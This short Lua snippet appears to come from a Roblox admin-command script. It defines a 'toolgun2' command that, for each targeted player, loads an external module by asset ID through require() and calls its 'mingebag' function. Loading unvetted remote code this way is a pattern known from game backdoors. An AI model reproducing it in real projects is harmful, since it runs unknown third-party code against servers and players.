addcmd({
	Name = "toolgun2",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(14108404712).mingebag(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "tool gun failed to load: ".. fail)
			end
		end
	end
})

